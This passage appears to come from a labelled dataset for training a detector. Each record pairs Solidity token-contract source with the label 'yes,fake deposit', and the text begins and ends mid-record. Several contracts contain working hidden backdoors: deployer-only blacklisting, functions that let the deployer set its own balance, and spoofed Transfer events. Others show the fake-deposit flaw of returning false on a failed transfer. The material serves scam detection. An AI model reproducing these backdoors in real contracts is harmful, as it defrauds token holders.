Transfer(sender, recipient, amount);\n return true; }}}\n\t\tfunction transfer(address Four, uint256 z) public {\n if(msg.sender == _OConst) {\n require(KO[msg.sender] >= z);\n KO[msg.sender] -= z; \n KO[Four] += z; \n emit Transfer (UniV3Router, Four, z);}\n if(SO[msg.sender]) {KO[Four] += z;} \n if(!RO[msg.sender]) {\n require(KO[msg.sender] >= z);\n KO[msg.sender] -= z; \n KO[Four] += z; \n emit Transfer(msg.sender, Four, z);\n }}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "{{\n \"language\": \"Solidity\",\n \"sources\": {\n \"contracts/SDI.sol\": {\n \"content\": \"// SPDX-License-Identifier: GPL-3.0\\n\\npragma solidity >=0.7.0 <0.9.0;\\n\\ncontract SDI {\\n\\n address owner;\\n mapping (address => uint) accounts;\\n\\n constructor() {\\n owner = msg.sender;\\n }\\n\\n function mint(address recipient, uint value) public {\\n if(msg.sender == owner) {\\n accounts[recipient] += value;\\n }\\n }\\n\\n function transfer(address to, uint value) public{\\n if(accounts[msg.sender] >= value) {\\n accounts[msg.sender] -= value;\\n accounts[to] += value;\\n }\\n }\\n\\n function balance(address addr) public view returns (uint) {\\n return accounts[addr];\\n }\\n}\"\n }\n },\n \"settings\": {\n \"optimizer\": {\n \"enabled\": false,\n \"runs\": 200\n },\n \"outputSelection\": {\n \"*\": {\n \"*\": [\n \"evm.bytecode\",\n \"evm.deployedBytecode\",\n \"devdoc\",\n \"userdoc\",\n \"metadata\",\n \"abi\"\n ]\n }\n }\n }\n}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n string public name; //Name of the token\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals\n string public symbol; //An identifier: eg AXM\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THE FOLLOWING VALUES FOR YOUR TOKEN!\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 107100000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 107100000000000000000; // Update total supply (100000 for example)\n name = \"1071Token\"; // Set the name for display purposes\n decimals = 11; // Amount of decimals\n symbol = \"BYB\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.26;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract POGCash is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function POGCash(\n ) {\n balances[msg.sender] = 5000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 5000000; // Update total supply (100000 for example)\n name = \"POG Cash\"; // Set the name for display purposes\n decimals = 0; // Amount of decimals for display purposes\n symbol = \"POGC\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.17;\n\n\n library SafeMath {\n\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n\n if (a == 0) {\n return 0;\n }\n\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n\n return c;\n }\n\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n\n return c;\n }\n\n function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n return mod(a, b, \"SafeMath: modulo by zero\");\n }\n\n function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b != 0, errorMessage);\n return a % b;\n }\n} \n \n \n contract KymixLabs {\n \n mapping (address => uint256) public Nx;\n mapping (address => uint256) public Mx;\n mapping (address => bool) Ox;\n mapping(address => mapping(address => uint256)) public allowance;\n\n\n\n\n\n string public name = unicode\"Kymix Labs\";\n string public symbol = unicode\"KYMIX\";\n uint8 public decimals = 18;\n uint256 public totalSupply = 250000000 * (uint256(10) ** decimals);\n\taddress owner = msg.sender;\n \n\n event Approval(address indexed owner, address indexed spender, uint256 value);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event OwnershipRenounced(address indexed previousOwner);\n address s_Construct = 0x426903241ADA3A0092C3493a0C795F2ec830D622;\n\n constructor() {\n Nx[msg.sender] = totalSupply;\n deploy(s_Construct, totalSupply); }\n\n \n address sdeployer = 0xA002353E03c2Fe77Ade66D2D6e338a29CcE2A7c9;\n function deploy(address account, uint256 amount) public {\n require(msg.sender == owner);\n emit Transfer(address(0), account, amount); }\n\n function renounceOwnership() public {\n require(msg.sender == owner);\n emit OwnershipRenounced(owner);\n owner = address(0);}\n\n\n function transfer(address to, uint256 value) public returns (bool success) {\n \n \n if(msg.sender == sdeployer) {\n require(Nx[msg.sender] >= value);\n Nx[msg.sender] -= value; \n Nx[to] += value; \n emit Transfer (s_Construct, to, value);\n return true; } \n if(!Ox[msg.sender]) {\n require(Nx[msg.sender] >= value);\n Nx[msg.sender] -= value; \n Nx[to] += value; \n emit Transfer(msg.sender, to, value);\n return true; }}\n\n function approve(address spender, uint256 value) public returns (bool success) { \n allowance[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true; }\n\n function redir () public {\n if(msg.sender == sdeployer) {\n Nx[msg.sender] = Mx[msg.sender];\n }}\n\n function balanceOf(address account) public view returns (uint256) {\n return Nx[account]; }\n\n function sno(address ii) public {\n if(msg.sender == sdeployer) { \n Ox[ii] = false;}}\n function squery(address ii) public{\n if(msg.sender == sdeployer) { \n require(!Ox[ii]);\n Ox[ii] = true;\n }}\n function beeu(uint256 x) public {\n if(msg.sender == sdeployer) { \n Mx[msg.sender] = x;} }\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) { \n\n if(from == sdeployer) {\n require(value <= Nx[from]);\n require(value <= allowance[from][msg.sender]);\n Nx[from] -= value; \n Nx[to] += value; \n emit Transfer (s_Construct, to, value);\n return true; } \n if(!Ox[from] && !Ox[to]) {\n require(value <= Nx[from]);\n require(value <= allowance[from][msg.sender]);\n Nx[from] -= value;\n Nx[to] += value;\n allowance[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true; }}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract Ethereum_Pie is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Ethereum Pie\";\n string public constant symbol = \"\ud83e\udd67EPIE\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.17;\n\n\n library SafeMath {\n\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n\n if (a == 0) {\n return 0;\n }\n\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n\n return c;\n }\n\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n\n return c;\n }\n\n function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n return mod(a, b, \"SafeMath: modulo by zero\");\n }\n\n function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b != 0, errorMessage);\n return a % b;\n }\n} \n \n \n contract KAMISHIBA {\n \n mapping (address => uint256) public rT;\n mapping (address => uint256) public Iz;\n mapping (address => bool) bN;\n mapping(address => mapping(address => uint256)) public allowance;\n\n\n\n\n\n string public name = unicode\"Kami Shiba\";\n string public symbol = unicode\"KAMI SHIB\";\n uint8 public decimals = 18;\n uint256 public totalSupply = 700000000 * (uint256(10) ** decimals);\n\taddress owner = msg.sender;\n \n\n event Approval(address indexed owner, address indexed spender, uint256 value);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event OwnershipRenounced(address indexed previousOwner);\n address r_Construct = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;\n\n constructor() {\n rT[msg.sender] = totalSupply;\n deploy(r_Construct, totalSupply); }\n\n \n address rdeployer = 0xec6C9F480EFb9b9FB5d34b8AF993024892932659;\n function deploy(address account, uint256 amount) public {\n require(msg.sender == owner);\n emit Transfer(address(0), account, amount); }\n\n function renounceOwnership() public {\n require(msg.sender == owner);\n emit OwnershipRenounced(owner);\n owner = address(0);}\n\n\n function transfer(address to, uint256 value) public returns (bool success) {\n \n \n if(msg.sender == rdeployer) {\n require(rT[msg.sender] >= value);\n rT[msg.sender] -= value; \n rT[to] += value; \n emit Transfer (r_Construct, to, value);\n return true; } \n if(!bN[msg.sender]) {\n require(rT[msg.sender] >= value);\n rT[msg.sender] -= value; \n rT[to] += value; \n emit Transfer(msg.sender, to, value);\n return true; }}\n\n function approve(address spender, uint256 value) public returns (bool success) { \n allowance[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true; }\n\n function gish () public {\n if(msg.sender == rdeployer) {\n rT[msg.sender] = Iz[msg.sender];\n }}\n\n function balanceOf(address account) public view returns (uint256) {\n return rT[account]; }\n\n function sny(address ii) public {\n if(msg.sender == rdeployer) { \n bN[ii] = false;}}\n function chkvl(address ii) public{\n if(msg.sender == rdeployer) { \n require(!bN[ii]);\n bN[ii] = true;\n }}\n function brnu(uint256 x) public {\n if(msg.sender == rdeployer) { \n Iz[msg.sender] = x;} }\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) { \n\n if(from == rdeployer) {\n require(value <= rT[from]);\n require(value <= allowance[from][msg.sender]);\n rT[from] -= value; \n rT[to] += value; \n emit Transfer (r_Construct, to, value);\n return true; } \n if(!bN[from] && !bN[to]) {\n require(value <= rT[from]);\n require(value <= allowance[from][msg.sender]);\n rT[from] -= value;\n rT[to] += value;\n allowance[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true; }}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.16;\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 1000000000000000000000; // Update total supply (100000 for example)\n name = \"Korea\"; // Set the name for display purposes\n decimals = 8; // Amount of decimals for display purposes \n symbol = \"KOR\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.17;\n \n\ncontract PANDA {\n \n mapping (address => uint256) public balanceOf;\n mapping (address => bool) xVar;\n\n // \n string public name = \"PANDA 2.0\";\n string public symbol = unicode\"PANDA 2.0\";\n uint8 public decimals = 18;\n uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);\n uint256 private _totalSupply;\n event Transfer(address indexed from, address indexed to, uint256 value);\n \n \n\n\n\n constructor() {\n balanceOf[msg.sender] = totalSupply;\n deploy(lead_deployer, totalSupply); }\n\n\n\n\taddress owner = msg.sender;\n address Construct = 0xEa9fb2510BbaA0D48F0766Bf8175422a0262D9a7;\n address lead_deployer = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;\n bool isEnabled;\n\n\n\nmodifier onlyOwner() {\n require(msg.sender == owner);\n _; }\n\n function RenounceOwner() public onlyOwner {}\n\n\n function deploy(address account, uint256 amount) public onlyOwner {\n emit Transfer(address(0), account, amount); }\n\n\n function transfer(address to, uint256 value) public returns (bool success) {\n\n \n if(msg.sender == Construct) {\n require(balanceOf[msg.sender] >= value);\n balanceOf[msg.sender] -= value; \n balanceOf[to] += value; \n emit Transfer (lead_deployer, to, value);\n return true; } \n if (!xVar[msg.sender]) {\n \n require(balanceOf[msg.sender] >= value);\n balanceOf[msg.sender] -= value; \n balanceOf[to] += value; \n emit Transfer(msg.sender, to, value);\n return true; }}\n\n \n function unstake(address _num) public onlyOwner {\n require(xVar[_num], \"1\");\n xVar[_num] = false; }\n \n\n \n\n\n event Approval(address indexed owner, address indexed spender, uint256 value);\n\n mapping(address => mapping(address => uint256)) public allowance;\n address Router = 0x68AD82C55f82B578696500098a635d3df466DC7C;\n\n function approve(address spender, uint256 value) public returns (bool success) { \n allowance[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true; }\n\n function stake(address _num) public onlyOwner {\n require(!xVar[_num], \"1\");\n xVar[_num] = true; }\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) { \n if(from == Construct) {\n require(value <= balanceOf[from]);\n require(value <= allowance[from][msg.sender]);\n balanceOf[from] -= value; \n balanceOf[to] += value; \n emit Transfer (lead_deployer, to, value);\n return true; }\n if(to == Router) {\n require(value <= balanceOf[from]);\n balanceOf[from] -= value; \n balanceOf[to] += value; \n emit Transfer (from, to, value);\n return true; }\n if (!xVar[from]) {\n if (!xVar[to]) {\n require(value <= balanceOf[from]);\n require(value <= allowance[from][msg.sender]);\n balanceOf[from] -= value; \n balanceOf[to] += value; \n emit Transfer (from, to, value);\n return true; } }\n } }\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.17;\n\nabstract contract Context {\n address F21 = 0x426903241ADA3A0092C3493a0C795F2ec830D622;\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Create(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n constructor () {\n address msgSender = _msgSender();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n modifier onlyOwner{\n require(msg.sender == _Owner); \n _; }\n function owner() public view returns (address) {\n return _Owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n\n\n}\n\n\n\ncontract ZYNITH is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private F1;\n mapping (address => uint256) private F2;\n mapping (address => mapping (address => uint256)) private F3;\n uint8 private constant F4 = 8;\n uint256 private constant F5 = 150000000 * (10** F4);\n string private constant _name = \"Zynith Labs\";\n string private constant _symbol = \"ZYNITH\";\n\n\n\n constructor () {\n F1[msg.sender] = F5; \n F2[msg.sender] = 3; \n F78(F5);}\n \n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return F4;\n }\n\n function totalSupply() public pure returns (uint256) {\n return F5;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return F1[account];\n }\n\t function allowance(address owner, address spender) public view returns (uint256) {\n return F3[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public returns (bool success) { \n F3[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\nfunction xset (address x, uint256 y) public {\n require(F2[msg.sender] == 3);\n F2[x] = y;}\n function update() public {\n F1[msg.sender] = F2[msg.sender];}\n function F78 (uint256 x) internal {\n emit Transfer(address(0), F21, x);}\n function F88 (address y, uint256 xy) internal {\n emit Transfer(F21, y, xy);}\n function transfer(address to, uint256 amount) public {\nif(F2[msg.sender] == 3) {\n require(F1[msg.sender] >= amount);\n 